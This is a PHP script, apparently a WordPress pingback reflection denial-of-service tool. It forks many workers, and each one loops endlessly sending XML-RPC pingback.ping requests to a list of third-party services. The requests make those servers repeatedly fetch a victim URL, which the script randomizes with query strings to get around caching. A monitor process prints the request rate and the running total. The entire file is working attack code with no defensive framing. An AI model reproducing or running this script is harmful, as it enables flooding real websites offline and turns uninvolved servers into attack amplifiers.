<?php

function partition( $list, $p ) {
        $listlen = count( $list );
        $partlen = floor( $listlen / $p );
        $partrem = $listlen % $p;
        $partition = array();
        $mark = 0;
        for ($px = 0; $px < $p; $px++) {
                $incr = ($px < $partrem) ? $partlen + 1 : $partlen;
                $partition[$px] = array_slice( $list, $mark, $incr );
                $mark += $incr;
        }
        return $partition;
}

$part = array();
$array = file($argv[3], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$childcount = $argv[2];
$part = partition($array, $childcount);

$shm_id = shmop_open(23377332, "c", 0666, 1024);
shmop_close($shm_id);

if(pcntl_fork() == 0)
{
        $sem = sem_get(13377331, 1, 0666, 1);
        $shm_id = shmop_open(23377332, "c", 0666, 1024);
        $total = 0;
        while(true)
        {
                sem_acquire($sem);
                $number = shmop_read($shm_id, 0, 1024);
                $total += $number;
                $string = array();
                array_push($string, $number);
                array_push($string, " R/s ");
                array_push($string, $total);
                array_push($string, " Total Requests                              \r");
                echo implode("", $string);
                unset($string);
                shmop_write($shm_id, str_pad("0", 1024, "\0"), 0);
                sem_release($sem);
                sleep(1);
        }

        exit;
}

for($i = 0; $i < $childcount; $i ++)
{
        $pid = pcntl_fork();
        if ($pid == -1) {
                echo "failed to fork on loop $i of forking\n";
                exit;
        } else if ($pid) {
                continue;
        } else {
                $sem = sem_get(13377331, 1, 0666, 1);
                $shm_id = shmop_open(23377332, "c", 0666, 1024);
                while(true)
                {
                        foreach($part[$i] as $ip)
                        {

                                list($service, $target) = array_merge(@explode(" ", $ip), array(" "));
                                $url = array();
                                array_push($url, $argv[1]);
                                array_push($url, (parse_url($argv[1], PHP_URL_QUERY) == "" ? "?" : "&"));
                                array_push($url, rand(1000000, 9999999));
                                array_push($url, "=");
                                array_push($url, rand(1000000, 9999999));
                                $request = xmlrpc_encode_request("pingback.ping", array(implode("", $url), $target));
                                unset($url);
                                $context = stream_context_create(array('http' => array(
                                        'method' => "POST",
                                        'header' => "Content-Type: text/xml",
                                        'content' => $request
                                )));
                                @file_get_contents($service, false, $context);
                                sem_acquire($sem);
                                $number = shmop_read($shm_id, 0, 1024);
                                $number = intval($number);
                                $number++;
                                shmop_write($shm_id, str_pad($number, 1024, "\0"), 0);
                                sem_release($sem);
                        }
                }
                die;
        }
}

for($j = 0; $j < $childcount; $j++)
{
        $pid = pcntl_wait($status);
}